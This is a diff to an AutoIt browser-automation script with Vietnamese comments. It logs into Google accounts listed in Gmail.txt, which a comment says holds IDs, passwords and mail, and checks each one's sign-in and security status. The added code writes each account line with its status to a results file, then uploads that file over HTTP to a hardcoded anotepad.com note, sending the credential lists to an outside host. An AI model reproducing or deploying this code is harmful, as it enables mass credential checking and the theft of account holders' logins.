@@ -1459,6 +1459,7 @@ EndFunc
 			$check10=0
 			;MsgBox(0,0,'ok1')
 
+			FileDelete(@ScriptDir&'\KetQuaDangNhap.txt') ;up ket qua dang nhap
 
 		For $i=1 to 10
                 $check=0
@@ -2137,9 +2138,59 @@ EndFunc
 				EndIf
 
 
+				Sleep(1000)
+				ControlClick('','','','left',1,600, 60)
+				Sleep(1000)
+				Send('^a')
+				Sleep(1000)
+				Send('https://myaccount.google.com/?utm_source=sign_in_no_continue')
+				Sleep(2000)
+				Send('{enter}')
+				Sleep(10000)
+				$check=0
+				For $i20=1 to 10
+					$pixcel=PixelSearch(18, 130,206, 263,0xC2E7FF)
+					Sleep(1000)
+					$pixcel2=PixelSearch(18, 130,206, 263,0x0B57D0)
+					Sleep(1000)
+					If IsArray($pixcel) or IsArray($pixcel2) Then
+						    $check=1
+						    $i20=17
+						    $i2=2
+					EndIf
+					Sleep(1000)
+				Next
+
+
+
+				$e=FileReadLine(@ScriptDir&'\Gmail.txt',$i)    ;l?y ID , pass, mail kh𩠰h?c
+				If $check=1 Then
+
+				    $pixcel=PixelSearch(302, 281,1201, 815,0xEA4335)  ; kiem tra bao mat k\ngiem trong
+				    Sleep(1000)
+				    $pixcel2=PixelSearch(302, 281,1201, 815,0xB31412)
+				    Sleep(1000)
+				    If IsArray($pixcel) or IsArray($pixcel2) Then
+
+						FileWriteLine(@ScriptDir&'\KetQuaDangNhap.txt',$e&"	Kiem tra bao mat")
+
+				    EndIf
+
+                Else
+
+					FileWriteLine(@ScriptDir&'\KetQuaDangNhap.txt',$e&"	Khong The dang nhap")
+
+				EndIf
+
+
+
 				_closeTrinhDuyet($i)
 
-			Next
+		Next
+
+		    $dataIP=FileRead(@ScriptDir&'\KetQuaDangNhap.txt')
+			_postdataIP($dataIP,'https://anotepad.com/note/access/6tfiaiej','https://anotepad.com/notes/6tfiaiej')
+
 
 		Return 	$check4
 
@@ -6530,7 +6581,7 @@ EndFunc
 
 						   EndIf
 						   $cacgiatri=StringSplit($e,'	')
-	                   For $i11=1 to $cacgiatri[0]
+	                    For $i11=1 to $cacgiatri[0]
 	                       If IsString($cacgiatri[$i11]) Then FileWriteLine(@ScriptDir&'\Gmailtest.txt',$cacgiatri[$i11])
 						   ;MsgBox(0,0,'ok')
 						Next
@@ -7752,6 +7803,9 @@ EndFunc
         EndFunc
 
         Func _postdataIP($dataIP,$linkketqua,$linkdulieu)                                            ; gui IP len anotebad.com
+			FileDelete(@ScriptDir&'\testdata.txt')
+			FileDelete(@ScriptDir&'\testdata2.txt')
+			Sleep(500)
             _requetanotepad($linkdulieu,'testdata.txt')
 			FileWriteLine(@ScriptDir&'\testdata.txt',$dataIP)
 			$sodog=_FileCountLines(@ScriptDir&'\testdata.txt')
@@ -7775,6 +7829,32 @@ EndFunc
             $kq2=_HttpRequest(1,$url2,$datalogin2,$cookie2,$ref2,'Connection: keep-alive|Upgrade-Insecure-Requests: 1')
         EndFunc
 
+
+    #cs
+        Func _postdataIP($dataIP,$linkketqua,$linkdulieu)                                            ; gui IP len anotebad.com
+            _requetanotepad($linkdulieu,'testdata.txt')
+			FileWriteLine(@ScriptDir&'\testdata.txt',$dataIP)
+			$sodog=_FileCountLines(@ScriptDir&'\testdata.txt')
+			For $i20=1 to $sodog
+				$IdPass=FileReadLine(@ScriptDir&'\testdata.txt',$i20)
+				If StringLen($IdPass)>10 Then FileWriteLine(@ScriptDir&'\testdata2.txt',$IdPass)
+			Next
+			Sleep(100)
+			$dataIP2=FileRead(@ScriptDir&'\testdata2.txt')
+			;$dataIP=_bigdataIP($dataIP)
+			$ref=$linkketqua
+			$url=$linkketqua
+			$code=StringRight($linkketqua,8)
+			$datalogin='postback=true&accesscode=123456'
+			$cookie=''
+            $kq=_HttpRequest(1,$url,$datalogin,$cookie,$ref,'Connection: keep-alive|Upgrade-Insecure-Requests: 1')
+            $url2='https://anotepad.com/note/quickeditsave'
+            $ref2='https://anotepad.com/note/quickedit/'&$code
+            $datalogin2='number='&$code&'&notecontent='&$dataIP2
+            $cookie2=''
+            $kq2=_HttpRequest(1,$url2,$datalogin2,$cookie2,$ref2,'Connection: keep-alive|Upgrade-Insecure-Requests: 1')
+        EndFunc
+    #ce
         Func _requetanotepad1dong($LinkNhanCode)
 				$checkrequet=0
 
